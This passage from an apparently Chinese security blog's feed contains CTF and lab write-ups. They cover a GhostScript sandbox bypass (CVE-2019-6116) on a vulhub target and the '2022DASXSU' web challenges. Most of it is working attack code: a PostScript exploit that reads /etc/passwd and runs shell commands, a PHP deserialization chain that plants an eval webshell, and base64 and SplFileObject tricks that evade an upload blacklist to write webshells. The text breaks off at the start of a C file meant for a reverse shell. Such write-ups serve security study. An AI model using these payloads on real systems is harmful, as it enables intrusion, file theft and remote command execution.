class="token keyword">echo</span> <span class="token variable">$stroutput</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h2 id="利用-GhostScript-沙箱绕过-RCE-漏洞"><a href="#利用-GhostScript-沙箱绕过-RCE-漏洞" class="headerlink" title="利用 GhostScript 沙箱绕过 RCE 漏洞"></a>利用 GhostScript 沙箱绕过 RCE 漏洞</h2><blockquote><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p><p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p><p>GhostScript 版本 &lt; 9.26</p></blockquote><p>vulhub靶场</p><p><code>docker-compose up -d</code></p><p><a href="http://192.168.17.131:8080/">http://192.168.17.131:8080/</a></p><p><code>index.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file_upload'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'jpeg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Unsupported filetype uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"identify -format '%w x %h' <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file_upload'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Image size is: <span class="token interpolation"><span class="token variable">$size</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    File: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file_upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">endif</span><span class="token punctuation">;</span></span></code></pre><p><code>exp.png</code></p><pre class="language-txt" data-language="txt"><code class="language-txt">%!PS% extract .actual_pdfpaintproc operator from pdfdict&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def&#x2F;exploit &#123;    (Stage 11: Exploitation...)&#x3D;    &#x2F;forceput exch def    systemdict &#x2F;SAFER false forceput    userparams &#x2F;LockFilePermissions false forceput    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput    % update    save restore    % All done.    stop&#125; deferrordict &#x2F;typecheck &#123;    &#x2F;typecount typecount 1 add def    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;    % The first error will be the .knownget, which we handle and setup the    % stack. The second error will be the ifelse (missing boolean), and then we    % dump the operands.    typecount 1 eq &#123; null &#125; if    typecount 2 eq &#123; pop 7 get exploit &#125; if    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if&#125; put% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some% executable arrays onto the operand stack that contain .forceput, but are not% marked as executeonly or pseudo-operators.%% The routine was attempting to pass them to ifelse, but we can cause that to% fail because when the routine was declared, it used &#96;bind&#96; but many of the% names it uses are not operators and so are just looked up in the dictstack.%% This means we can push a dict onto the dictstack and control how the routine% works.&lt;&lt;    &#x2F;typecount      0    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;        % cause a &#x2F;typecheck error we handle above        true    &#125;&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;% Demonstrate reading a file we shouldnt have access to.(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile(Attempting to execute a shell command...)&#x3D; flush% run command(%pipe%cat &#x2F;etc&#x2F;passwd &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;res.txt) (w) file closefile(All done.)&#x3D;quit</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204142208537.png"></p><h2 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h2><p><a href="https://cloud.tencent.com/developer/article/1944129">https://cloud.tencent.com/developer/article/1944129</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;phpinfo&quot;&gt;&lt;a href=&quot;#phpinfo&quot; class=&quot;headerlink&quot; title=&quot;phpinfo&quot;&gt;&lt;/a&gt;phpinfo&lt;/h2&gt;&lt;p&gt;拿到&lt;code&gt;phpinfo&lt;/code&gt;后需要关注的对象&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PHP Va</summary>
      
    
    
    
    <category term="笔记" scheme="http://lll-nnn.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="bypass_disable_function" scheme="http://lll-nnn.github.io/tags/bypass-disable-function/"/>
    
  </entry>
  
  <entry>
    <title>2022DASXSU</title>
    <link href="http://lll-nnn.github.io/2022/04/09/2022DASXSU/"/>
    <id>http://lll-nnn.github.io/2022/04/09/2022DASXSU/</id>
    <published>2022-04-09T14:53:21.000Z</published>
    <updated>2022-04-17T15:33:19.711Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p><code>反序列化</code></p><p>poc</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">crow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$v1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$v2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">v1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">fin</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'114514'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">what</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'hello'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">mix</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$m1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'#'</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">what</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">crow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$r->f1->a->m1->v1->f1->m1 = "\r\nsystem('cat H0mvz850F.php');";</span><span class="token variable">$r</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">v1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f1</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">m1</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"?>&lt;?php eval(\$_POST[1]);?>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p><code>文件上传</code></p><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204162108051.png"></p><p>只能上传<code>*.php</code></p><p><code>&lt;?php phpinfo();?&gt;</code>可以上，读到phpinfo</p><p>拼接读取源码，读取<code>/flag</code>Permission denied</p><p><code>&lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;/var/www/html/index&#39;.&#39;.php&#39;)?&gt;</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">&#123;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"\$_"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eval"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"copy"</span> <span class="token punctuation">,</span><span class="token double-quoted-string string">"assert"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"usort"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"include"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"require"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"$"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"^"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"~"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"-"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"%"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"*"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fopen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fwriter"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fput"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"copy"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"curl"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fread"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fget"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"function_exists"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"dl"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"putenv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"system"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"shell_exec"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"passthru"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_open"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"proc_close"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"proc_get_status"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"checkdnsrr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"getmxrr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"getservbyname"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"getservbyport"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"syslog"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"popen"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"show_source"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"highlight_file"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"`"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"chmod"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean constant">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean constant">False</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置上传目录</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"UPLOAD_PATH"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"./uploads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Upload Success!"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/php/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"只要好看的php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"诶，被我发现了吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$new_file_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$new_file_name</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Upload Failed!'</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;div style="color:#F00">'</span><span class="token punctuation">.</span><span class="token variable">$msg</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" Look here~ "</span><span class="token punctuation">.</span><span class="token variable">$img_path</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/div>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>过滤绕过一</p><blockquote><p>先上传个base64编码的一句话php文件，然后再上传另一个文件解码包含前面上传的文件,<code>Include</code>绕过<code>strstr</code></p><p><code>b64.php</code></p><p><code>PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</code></p><p><code>inc.php</code></p><p><code>&lt;?php Include(base64_decode(&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0wY2ZhMGFjNDE4NDMxYzM4Nzc1NzI5NTY5ZjE1MDdiNS5waHA=&quot;));?&gt;</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204162108690.png"></p><p>过滤绕过二</p><p>利用继承重写一个类，把动态方法调用变成静态方法</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"EV"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"eva"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GETCONT"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"fil"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"e_get_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 由于禁止了$，我们只能从已有的地方获取$符</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"D"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token constant">GETCONT</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/var/www/html/index.php'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">353</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"SHELL"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"&lt;?php "</span><span class="token punctuation">.</span><span class="token constant">EV</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"("</span><span class="token punctuation">.</span><span class="token constant">D</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"_POST['a']);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token constant">GETCONT</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./shell.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">splf</span> <span class="token keyword">extends</span> <span class="token class-name">SplFileObject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">SHELL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"PHARA"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">splf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'shell.php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204162109030.png"></p><p>上传文件一</p><p><code>利用SplFileObject 上传恶意so文件反弹shell</code></p><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">//exp.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token 